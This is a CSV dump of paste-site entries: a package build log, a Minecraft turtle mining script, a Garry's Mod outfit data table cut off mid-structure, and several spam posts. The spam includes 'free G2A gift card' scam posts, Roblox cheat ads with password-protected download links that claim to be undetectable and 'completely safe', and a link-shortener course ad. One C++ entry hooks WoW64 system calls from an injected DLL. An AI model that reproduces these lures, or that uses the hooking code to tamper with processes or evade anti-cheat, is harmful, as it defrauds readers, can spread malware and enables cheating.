id,title,username,language,date,content
K0rTXfKB,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Friday 17th of May 2024 12:53:43 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
17 May 2024"
eCvd7HVi,Roblox Executor \\ Roblox Free Executor \\ Roblox Script Executor \\ Roblox Executor Download,jordanthebordan,C++,Friday 17th of May 2024 12:51:28 PM CDT,"Download - https://www.youtube.com/watch?v=kQq3NOEZdVs
 
Note
Roblox AURORA X cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
 
Download - https://www.youtube.com/watch?v=kQq3NOEZdVs
 
Features 🛠️:
ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
Download - https://www.youtube.com/watch?v=kQq3NOEZdVs
 
Tip
1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
2. Most importantly: the program is completely safe for your Windows system.
3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
4. Password Archive - 1234
 
 
Download - https://www.youtube.com/watch?v=kQq3NOEZdVs"
EhYEgW5X,errors during package installation,heroiccocoa,Bash,Friday 17th of May 2024 12:40:12 PM CDT,"[ggtdd@endeavour ~]$ yay -Syu syncthing-gtk
:: Synchronizing package databases...
 endeavouros is up to date
 core is up to date
 extra is up to date
 multilib is up to date
:: Searching AUR for updates...
:: Searching databases for updates...
:: 4 dependencies will also be installed for this operation.
   extra/python-bcrypt       -> 4.1.2-2
   extra/python-dateutil     -> 2.9.0-5
   extra/python-setuptools   -> 1:69.0.3-6
   (make dependency of syncthing-gtk)
   extra/syncthing           -> 1.27.7-1

:: 1 package to upgrade/install.
1  aur/syncthing-gtk   -> 0.9.4.5-1
==> Packages to exclude: (eg: ""1 2 3"", ""1-3"", ""^4"" or repo name)
 -> Excluding packages may cause partial upgrades and break systems
==> 
Sync Make Dependency (1): python-setuptools-1:69.0.3-6
Sync Dependency (3): python-dateutil-2.9.0-5, syncthing-1.27.7-1, python-bcrypt-4.1.2-2
AUR Explicit (1): syncthing-gtk-0.9.4.5-1
:: (1/1) Downloaded PKGBUILD: syncthing-gtk
  1 syncthing-gtk                    (Build Files Exist)
==> Packages to cleanBuild?
==> [N]one [A]ll [Ab]ort [I]nstalled [No]tInstalled or (1 2 3, 1-3, ^4)
==> 
  1 syncthing-gtk                    (Build Files Exist)
==> Diffs to show?
==> [N]one [A]ll [Ab]ort [I]nstalled [No]tInstalled or (1 2 3, 1-3, ^4)
==> 
==> Making package: syncthing-gtk 0.9.4.5-1 (Fri 17 May 2024 18:32:16)
==> Retrieving sources...
  -> Downloading syncthing-gtk-0.9.4.5.tar.gz...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  737k    0  737k    0     0   998k      0 --:--:-- --:--:-- --:--:--  998k
==> WARNING: Skipping verification of source file PGP signatures.
==> Validating source files with sha256sums...
    syncthing-gtk-0.9.4.5.tar.gz ... Passed
:: Remove make dependencies after install? [y/N] y
:: (1/1) Parsing SRCINFO: syncthing-gtk
:: Synchronizing package databases...
 endeavouros is up to date
 core is up to date
 extra is up to date
 multilib is up to date
:: Starting full system upgrade...
resolving dependencies...
looking for conflicting packages...

Package (19)                     New Version  Net Change  Download Size

extra/python-autocommand         2.2.2-6        0.08 MiB       0.02 MiB
extra/python-fastjsonschema      2.19.1-3       0.26 MiB       0.05 MiB
extra/python-inflect             7.2.1-2        0.36 MiB       0.07 MiB
extra/python-jaraco.context      4.3.0-4        0.03 MiB       0.01 MiB
extra/python-jaraco.functools    4.0.1-1        0.07 MiB       0.02 MiB
extra/python-jaraco.text         3.12.0-3       0.08 MiB       0.02 MiB
extra/python-more-itertools      10.2.0-2       0.61 MiB       0.09 MiB
extra/python-ordered-set         4.1.0-5        0.06 MiB       0.01 MiB
extra/python-platformdirs        4.2.0-3        0.23 MiB       0.03 MiB
extra/python-six                 1.16.0-9       0.11 MiB       0.03 MiB
extra/python-tomli               2.0.1-4        0.10 MiB       0.03 MiB
extra/python-trove-classifiers   2024.4.10-1    0.12 MiB       0.02 MiB
extra/python-typeguard           4.2.1-2        0.40 MiB       0.08 MiB
extra/python-typing_extensions   4.11.0-1       0.38 MiB       0.06 MiB
extra/python-validate-pyproject  0.16-1         0.31 MiB       0.08 MiB
extra/python-bcrypt              4.1.2-2        0.52 MiB       0.21 MiB
extra/python-dateutil            2.9.0-5        0.99 MiB       0.29 MiB
extra/python-setuptools          1:69.0.3-6     4.39 MiB       0.73 MiB
extra/syncthing                  1.27.7-1      23.03 MiB       8.43 MiB

Total Download Size:   10.28 MiB
Total Installed Size:  32.14 MiB

:: Proceed with installation? [Y/n] y
:: Retrieving packages...
 python-bcrypt-4.1.2-2-x86_64          212.1 KiB  1632 KiB/s 00:00 [------------------------------------] 100%
 python-more-itertools-10.2.0-2-any     97.0 KiB   746 KiB/s 00:00 [------------------------------------] 100%
 python-dateutil-2.9.0-5-any           300.9 KiB  2.04 MiB/s 00:00 [------------------------------------] 100%
 python-setuptools-1:69.0.3-6-any      749.0 KiB  4.57 MiB/s 00:00 [------------------------------------] 100%
 python-typeguard-4.2.1-2-any           79.4 KiB  1689 KiB/s 00:00 [------------------------------------] 100%
 python-validate-pyproject-0.16-1-any   77.6 KiB  1551 KiB/s 00:00 [------------------------------------] 100%
 python-inflect-7.2.1-2-any             73.9 KiB  1368 KiB/s 00:00 [------------------------------------] 100%
 python-typing_extensions-4.11.0-...    66.4 KiB  1166 KiB/s 00:00 [------------------------------------] 100%
 syncthing-1.27.7-1-x86_64               8.4 MiB  26.4 MiB/s 00:00 [------------------------------------] 100%
 python-fastjsonschema-2.19.1-3-any     47.3 KiB   845 KiB/s 00:00 [------------------------------------] 100%
 python-six-1.16.0-9-any                27.3 KiB   683 KiB/s 00:00 [------------------------------------] 100%
 python-platformdirs-4.2.0-3-any        31.6 KiB   478 KiB/s 00:00 [------------------------------------] 100%
 python-tomli-2.0.1-4-any               26.6 KiB   618 KiB/s 00:00 [------------------------------------] 100%
 python-autocommand-2.2.2-6-any         23.7 KiB   447 KiB/s 00:00 [------------------------------------] 100%
 python-jaraco.text-3.12.0-3-any        19.7 KiB   364 KiB/s 00:00 [------------------------------------] 100%
 python-trove-classifiers-2024.4....    18.8 KiB   400 KiB/s 00:00 [------------------------------------] 100%
 python-jaraco.functools-4.0.1-1-any    16.6 KiB   331 KiB/s 00:00 [------------------------------------] 100%
 python-ordered-set-4.1.0-5-any         15.3 KiB   255 KiB/s 00:00 [------------------------------------] 100%
 python-jaraco.context-4.3.0-4-any      10.9 KiB   165 KiB/s 00:00 [------------------------------------] 100%
 Total (19/19)                          10.3 MiB  17.9 MiB/s 00:01 [------------------------------------] 100%
(19/19) checking keys in keyring                                   [------------------------------------] 100%
(19/19) checking package integrity                                 [------------------------------------] 100%
(19/19) loading package files                                      [------------------------------------] 100%
(19/19) checking for file conflicts                                [------------------------------------] 100%
:: Processing package changes...
( 1/19) installing syncthing                                       [------------------------------------] 100%
( 2/19) installing python-bcrypt                                   [------------------------------------] 100%
( 3/19) installing python-more-itertools                           [------------------------------------] 100%
( 4/19) installing python-jaraco.functools                         [------------------------------------] 100%
( 5/19) installing python-jaraco.context                           [------------------------------------] 100%
( 6/19) installing python-autocommand                              [------------------------------------] 100%
( 7/19) installing python-typing_extensions                        [------------------------------------] 100%
( 8/19) installing python-typeguard                                [------------------------------------] 100%
( 9/19) installing python-inflect                                  [------------------------------------] 100%
(10/19) installing python-jaraco.text                              [------------------------------------] 100%
(11/19) installing python-ordered-set                              [------------------------------------] 100%
(12/19) installing python-platformdirs                             [------------------------------------] 100%
(13/19) installing python-tomli                                    [------------------------------------] 100%
(14/19) installing python-fastjsonschema                           [------------------------------------] 100%
(15/19) installing python-trove-classifiers                        [------------------------------------] 100%
(16/19) installing python-validate-pyproject                       [------------------------------------] 100%
(17/19) installing python-setuptools                               [------------------------------------] 100%
(18/19) installing python-six                                      [------------------------------------] 100%
(19/19) installing python-dateutil                                 [------------------------------------] 100%
:: Running post-transaction hooks...
(1/4) Reloading system manager configuration...
(2/4) Reloading user manager configuration...
(3/4) Applying kernel sysctl settings...
(4/4) Arming ConditionNeedsUpdate...
==> Making package: syncthing-gtk 0.9.4.5-1 (Fri 17 May 2024 18:32:32)
==> Checking runtime dependencies...
==> Checking buildtime dependencies...
==> Retrieving sources...
  -> Found syncthing-gtk-0.9.4.5.tar.gz
==> Validating source files with sha256sums...
    syncthing-gtk-0.9.4.5.tar.gz ... Passed
==> Removing existing $srcdir/ directory...
==> Extracting sources...
  -> Extracting syncthing-gtk-0.9.4.5.tar.gz with bsdtar
==> Starting prepare()...
==> Sources are ready.
==> Making package: syncthing-gtk 0.9.4.5-1 (Fri 17 May 2024 18:32:33)
==> Checking runtime dependencies...
==> Checking buildtime dependencies...
==> WARNING: Using existing $srcdir/ tree
==> Starting build()...
fatal: No names found, cannot describe anything.
==> Entering fakeroot environment...
==> Starting package()...
fatal: No names found, cannot describe anything.
/usr/lib/python3.12/site-packages/setuptools/_distutils/cmd.py:66: SetuptoolsDeprecationWarning: setup.py install is deprecated.
!!

        ********************************************************************************
        Please avoid running ``setup.py`` directly.
        Instead, use pypa/build, pypa/installer or other
        standards-based tools.

        See https://blog.ganssle.io/articles/2021/10/setup-py-deprecated.html for details.
        ********************************************************************************

!!
  self.initialize_options()
/usr/lib/python3.12/site-packages/syncthing_gtk/app.py:901: SyntaxWarning: invalid escape sequence '\('
/usr/lib/python3.12/site-packages/syncthing_gtk/foldereditor.py:23: SyntaxWarning: invalid escape sequence '\-'
/usr/lib/python3.12/site-packages/syncthing_gtk/app.py:901: SyntaxWarning: invalid escape sequence '\('
/usr/lib/python3.12/site-packages/syncthing_gtk/foldereditor.py:23: SyntaxWarning: invalid escape sequence '\-'
==> Tidying install...
  -> Removing libtool files...
  -> Purging unwanted files...
  -> Removing static library files...
  -> Stripping unneeded symbols from binaries and libraries...
  -> Compressing man and info pages...
==> Checking for packaging issues...
==> Creating package ""syncthing-gtk""...
  -> Generating .PKGINFO file...
  -> Generating .BUILDINFO file...
  -> Generating .MTREE file...
  -> Compressing package...
==> Leaving fakeroot environment.
==> Finished making: syncthing-gtk 0.9.4.5-1 (Fri 17 May 2024 18:32:35)
==> Cleaning up...
loading packages...
resolving dependencies...
looking for conflicting packages...

Package (1)    New Version  Net Change

syncthing-gtk  0.9.4.5-1      2.10 MiB

Total Installed Size:  2.10 MiB

:: Proceed with installation? [Y/n] y 
(1/1) checking keys in keyring                                                                 [-------------------------------------------------------] 100%
(1/1) checking package integrity                                                               [-------------------------------------------------------] 100%
(1/1) loading package files                                                                    [-------------------------------------------------------] 100%
(1/1) checking for file conflicts                                                              [-------------------------------------------------------] 100%
:: Processing package changes...
(1/1) installing syncthing-gtk                                                                 [-------------------------------------------------------] 100%
:: Running post-transaction hooks...
(1/3) Arming ConditionNeedsUpdate...
(2/3) Updating icon theme caches...
(3/3) Updating the desktop file MIME type cache...
checking dependencies...
:: python optionally requires python-setuptools: for building Python packages using tooling that is usually bundled with Python
:: python-future optionally requires python-setuptools: futurize and pasteurize scripts

Package (15)               Old Version  Net Change

python-autocommand         2.2.2-6       -0.08 MiB
python-fastjsonschema      2.19.1-3      -0.26 MiB
python-inflect             7.2.1-2       -0.36 MiB
python-jaraco.context      4.3.0-4       -0.03 MiB
python-jaraco.functools    4.0.1-1       -0.07 MiB
python-jaraco.text         3.12.0-3      -0.08 MiB
python-more-itertools      10.2.0-2      -0.61 MiB
python-ordered-set         4.1.0-5       -0.06 MiB
python-platformdirs        4.2.0-3       -0.23 MiB
python-tomli               2.0.1-4       -0.10 MiB
python-trove-classifiers   2024.4.10-1   -0.12 MiB
python-typeguard           4.2.1-2       -0.40 MiB
python-typing_extensions   4.11.0-1      -0.38 MiB
python-validate-pyproject  0.16-1        -0.31 MiB
python-setuptools          1:69.0.3-6    -4.39 MiB

Total Removed Size:  7.49 MiB

:: Do you want to remove these packages? [Y/n] 
:: Processing package changes...
( 1/15) removing python-setuptools                                                             [-------------------------------------------------------] 100%
( 2/15) removing python-validate-pyproject                                                     [-------------------------------------------------------] 100%
( 3/15) removing python-trove-classifiers                                                      [-------------------------------------------------------] 100%
( 4/15) removing python-fastjsonschema                                                         [-------------------------------------------------------] 100%
( 5/15) removing python-tomli                                                                  [-------------------------------------------------------] 100%
( 6/15) removing python-platformdirs                                                           [-------------------------------------------------------] 100%
( 7/15) removing python-ordered-set                                                            [-------------------------------------------------------] 100%
( 8/15) removing python-jaraco.text                                                            [-------------------------------------------------------] 100%
( 9/15) removing python-jaraco.functools                                                       [-------------------------------------------------------] 100%
(10/15) removing python-jaraco.context                                                         [-------------------------------------------------------] 100%
(11/15) removing python-inflect                                                                [-------------------------------------------------------] 100%
(12/15) removing python-typeguard                                                              [-------------------------------------------------------] 100%
(13/15) removing python-typing_extensions                                                      [-------------------------------------------------------] 100%
(14/15) removing python-autocommand                                                            [-------------------------------------------------------] 100%
(15/15) removing python-more-itertools                                                         [-------------------------------------------------------] 100%
:: Running post-transaction hooks...
(1/1) Arming ConditionNeedsUpdate...
"
DLZe57ds,Untitled,problemlow,Lua,Friday 17th of May 2024 12:33:45 PM CDT,"print(""enter tunnel length"")
startLength = tonumber(read())

function bigDig()
    turtle.dig()
    turtle.dig()
    turtle.dig()
    turtle.dig()
    turtle.dig()
    turtle.dig()
    turtle.dig()
    turtle.dig()
    turtle.select(2)
    turtle.place()
    turtle.select(1)
    turtle.dig()
end

function bigDigUp()
    turtle.digUp()
    turtle.digUp()
    turtle.digUp()
    turtle.digUp()
    turtle.digUp()
    turtle.digUp()
    turtle.digUp()
    turtle.digUp()
    turtle.select(2)
    turtle.place()
    turtle.select(1)
    turtle.digUp()
end

length = startLength
nextTorch = torchInterval
while length > 0 do
    bigDig()
    turtle.turnLeft()
    bigDig()
    turtle.turnRight()
    turtle.turnRight()
    bigDig()
    if length == nextTorch then
        nextTorch = nextTorch+torchInterval
        turtle.place()
    end
    turtle.turnLeft()
    turtle.forward()
    length = length-1
end
 
turtle.turnLeft()
turtle.turnLeft()
turtle.digDown()
turtle.down()
 
 
length = startLength
while length > 0 do
    bigDig()
    turtle.turnLeft()
    bigDig()
    turtle.turnRight()
    turtle.turnRight()
    bigDig()
    turtle.turnLeft()
    turtle.forward()
    length = length-1
end
 
turtle.turnLeft()
turtle.turnLeft()
turtle.digDown()
turtle.down()
 
 
length = startLength
while length > 0 do
    bigDig()
    turtle.turnLeft()
    bigDig()
    turtle.turnRight()
    turtle.turnRight()
    bigDig()
    turtle.turnLeft()
    turtle.forward()
    length = length-1
end
"
mxrxTZXL,Untitled,sissou123,Python,Friday 17th of May 2024 12:25:24 PM CDT,"Learn Python Programming - Beginner to Master
Become a Python Expert. for Both Academics and Industry. 100+ Challenges 
What you'll learn
Master Python Programming by doing 100+ Challenges
Detail understanding of fundamentals
Build Multithreaded Applications 
for more:https://cuty.io/HFIgvrYRVH
"
20wipKjP,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Friday 17th of May 2024 12:19:45 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_190584.pdf

Working as of:
17 May 2024"
iyH0gxLh,Roblox AURORAX Hack \ Cheat,jordanthebordan,C++,Friday 17th of May 2024 12:13:01 PM CDT,"Download - https://www.youtube.com/watch?v=kQq3NOEZdVs

Note
Roblox AURORA X cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.

Download - https://www.youtube.com/watch?v=kQq3NOEZdVs
 
Features 🛠️:
ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
Download - https://www.youtube.com/watch?v=kQq3NOEZdVs
 
Tip
1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
2. Most importantly: the program is completely safe for your Windows system.
3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
4. Password Archive - 1234
 
 
Download - https://www.youtube.com/watch?v=kQq3NOEZdVs
"
Uj5kMdc3,wow64,Riremito,C++,Friday 17th of May 2024 12:09:50 PM CDT,"#include<Windows.h>
#pragma comment(linker,""/SECTION:.magic,ERW"")
#pragma code_seg("".magic"")
void __declspec(naked) EnterSystemCall() {
	__asm {
		__emit(0xCC);
		__emit(0xCC);
		__emit(0xCC);
		__emit(0xCC);
		__emit(0xCC);
		__emit(0xCC);
		__emit(0xCC);
	}
}
#pragma code_seg()
// you can understand which api is called by checking eax value here
void __declspec(naked) HookSystemCall() {
	__asm {
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		jmp EnterSystemCall
	}
}

bool Install() {
	ULONG_PTR uFsC0 = __readfsdword(0xC0);
	// copy original x86 to x64 switch code
	memcpy_s((void *)EnterSystemCall, 0x07, (void *)uFsC0, 0x07);
	DWORD old;
	if (!VirtualProtect((void *)uFsC0, 0x07, PAGE_EXECUTE_READWRITE, &old)) {
		return false;
	}

	// lock
	*(WORD *)uFsC0 = 0xFEEB;
	// write hook jmp
	*(BYTE *)(uFsC0 + 0x02) = 0xE9;
	*(DWORD *)(uFsC0 + 0x03) = (ULONG_PTR)HookSystemCall - (uFsC0 + 0x02) - 0x05;
	// unlock
	*(WORD *)uFsC0 = 0x00EB;

	if (!VirtualProtect((void *)uFsC0, 0x07, old, &old)) {
		return false;
	}

	return true;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	if (fdwReason == DLL_PROCESS_ATTACH) {
		DisableThreadLibraryCalls(hinstDLL);
		Install();
	}
	return TRUE;
}"
x7XTLYF7,Ghost Follower pointshop edit/fix,iAteMybingoCard-exe,Lua,Friday 17th of May 2024 12:01:33 PM CDT,"[1] = {
	[""children""] = {
		[1] = {
			[""children""] = {
				[1] = {
					[""children""] = {
						[1] = {
							[""children""] = {
								[1] = {
									[""children""] = {
										[1] = {
											[""children""] = {
												[1] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""1638377013"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(-1.444000005722, -0.44999998807907, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, 45, 2.305188900209e-05),
													},
												},
												[2] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""3665853758"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(1.444000005722, 0.44999998807907, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, -135, 2.305188900209e-05),
													},
												},
												[3] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""2614187089"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(1.444000005722, -0.44999998807907, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, 135, 2.305188900209e-05),
													},
												},
												[4] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""1375577112"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(-1.444000005722, 0, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, 0, 2.305188900209e-05),
													},
												},
												[5] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""3000625246"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(-1.444000005722, 0.44999998807907, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, -45, 2.305188900209e-05),
													},
												},
												[6] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""3068825500"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(1.444000005722, 0, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, 180, 2.305188900209e-05),
													},
												},
											},
											[""self""] = {
												[""Skin""] = 0,
												[""Invert""] = false,
												[""LightBlend""] = 1,
												[""CellShade""] = 0,
												[""AimPartName""] = """",
												[""IgnoreZ""] = false,
												[""AimPartUID""] = """",
												[""Passes""] = 1,
												[""Name""] = """",
												[""Angles""] = Angle(0, 0, 0),
												[""DoubleFace""] = true,
												[""PositionOffset""] = Vector(0, 0, 0),
												[""BlurLength""] = 0,
												[""OwnerEntity""] = false,
												[""Brightness""] = 20,
												[""DrawOrder""] = -1,
												[""BlendMode""] = """",
												[""TintColor""] = Vector(0, 0, 0),
												[""Alpha""] = 1,
												[""LodOverride""] = -1,
												[""TargetEntityUID""] = """",
												[""BlurSpacing""] = 0,
												[""UsePlayerColor""] = false,
												[""Material""] = ""https://i.imgur.com/sB8t470.jpeg"",
												[""UseWeaponColor""] = false,
												[""EyeAngles""] = false,
												[""UseLegacyScale""] = false,
												[""Bone""] = ""head"",
												[""Color""] = Vector(255, 255, 255),
												[""Fullbright""] = false,
												[""BoneMerge""] = false,
												[""IsDisturbing""] = false,
												[""Position""] = Vector(0, 0, -0.10400000214577),
												[""NoTextureFiltering""] = false,
												[""AlternativeScaling""] = false,
												[""Hide""] = false,
												[""Translucent""] = true,
												[""Scale""] = Vector(1, 1, 1),
												[""ClassName""] = ""model"",
												[""EditorExpand""] = true,
												[""Size""] = 0.375,
												[""ModelFallback""] = """",
												[""AngleOffset""] = Angle(0, 0, 0),
												[""TextureFilter""] = 3,
												[""Model""] = ""https://dl.dropboxusercontent.com/s/x6ieklc9tweqeu5/Ghost%20Eye.obj?dl=0"",
												[""UniqueID""] = ""162283847"",
											},
										},
										[2] = {
											[""children""] = {
												[1] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""1977254548"",
														[""TargetEntityUID""] = """",
														[""Alpha""] = 1,
														[""SizeX""] = 3.5,
														[""SizeY""] = 1,
														[""NoTextureFiltering""] = false,
														[""Bone""] = ""head"",
														[""BlendMode""] = """",
														[""Translucent""] = true,
														[""IgnoreZ""] = false,
														[""IsDisturbing""] = false,
														[""Position""] = Vector(0, 0, -1.2999999523163),
														[""AimPartUID""] = """",
														[""AngleOffset""] = Angle(0, 0, 0),
														[""Hide""] = false,
														[""Name""] = """",
														[""AimPartName""] = """",
														[""EditorExpand""] = false,
														[""Angles""] = Angle(0, 0, 0),
														[""Size""] = 8.3500003814697,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""Color""] = Vector(0, 161, 255),
														[""ClassName""] = ""sprite"",
														[""EyeAngles""] = false,
														[""SpritePath""] = ""sprites/light_ignorez"",
													},
												},
											},
											[""self""] = {
												[""Skin""] = 0,
												[""Invert""] = false,
												[""LightBlend""] = 1,
												[""CellShade""] = 0,
												[""AimPartName""] = """",
												[""IgnoreZ""] = false,
												[""AimPartUID""] = """",
												[""Passes""] = 1,
												[""Name""] = ""ghost%eye 1"",
												[""Angles""] = Angle(0, 0, 0),
												[""DoubleFace""] = true,
												[""PositionOffset""] = Vector(0, 0, 0),
												[""BlurLength""] = 0,
												[""OwnerEntity""] = false,
												[""Brightness""] = 1,
												[""DrawOrder""] = 0,
												[""BlendMode""] = """",
												[""TintColor""] = Vector(0, 0, 0),
												[""Alpha""] = 1,
												[""LodOverride""] = -1,
												[""TargetEntityUID""] = """",
												[""BlurSpacing""] = 0,
												[""UsePlayerColor""] = false,
												[""Material""] = ""https://i.imgur.com/BUK5qg0_d.jpg?maxwidth=520&shape=thumb&fidelity=high"",
												[""UseWeaponColor""] = false,
												[""EyeAngles""] = false,
												[""UseLegacyScale""] = false,
												[""Bone""] = ""head"",
												[""Color""] = Vector(255, 255, 255),
												[""Fullbright""] = false,
												[""BoneMerge""] = false,
												[""IsDisturbing""] = false,
												[""Position""] = Vector(0, 0, 0),
												[""NoTextureFiltering""] = false,
												[""AlternativeScaling""] = false,
												[""Hide""] = false,
												[""Translucent""] = true,
												[""Scale""] = Vector(1, 1, 1),
												[""ClassName""] = ""model"",
												[""EditorExpand""] = true,
												[""Size""] = 0.375,
												[""ModelFallback""] = """",
												[""AngleOffset""] = Angle(0, 0, 0),
												[""TextureFilter""] = 3,
												[""Model""] = ""https://dl.dropboxusercontent.com/s/x6ieklc9tweqeu5/Ghost%20Eye.obj?dl=0"",
												[""UniqueID""] = ""1562157376"",
											},
										},
										[3] = {
											[""children""] = {
												[1] = {
													[""children""] = {
														[1] = {
															[""children""] = {
															},
															[""self""] = {
																[""DrawOrder""] = 0,
																[""UniqueID""] = ""889705052"",
																[""Axis""] = ""y"",
																[""Input""] = ""timeex"",
																[""TargetPartUID""] = """",
																[""InputMultiplier""] = 2.5,
																[""RootOwner""] = false,
																[""TargetEntityUID""] = """",
																[""ZeroEyePitch""] = false,
																[""ClassName""] = ""proxy"",
																[""ResetVelocitiesOnHide""] = true,
																[""VelocityRoughness""] = 10,
																[""Max""] = -1.6000000238419,
																[""Pow""] = 100,
																[""EditorExpand""] = false,
																[""AffectChildren""] = false,
																[""Min""] = 0,
																[""Hide""] = false,
																[""Name""] = """",
																[""VariableName""] = ""Position"",
																[""Offset""] = 2.2000000476837,
																[""PlayerAngles""] = false,
																[""Additive""] = false,
																[""InputDivider""] = 1,
																[""IsDisturbing""] = false,
																[""OutputTargetPartUID""] = """",
																[""Function""] = ""sin"",
																[""Expression""] = """",
															},
														},
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""1139656782"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(0, -0, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = true,
														[""PositionOffset""] = Vector(0, 0, 0),
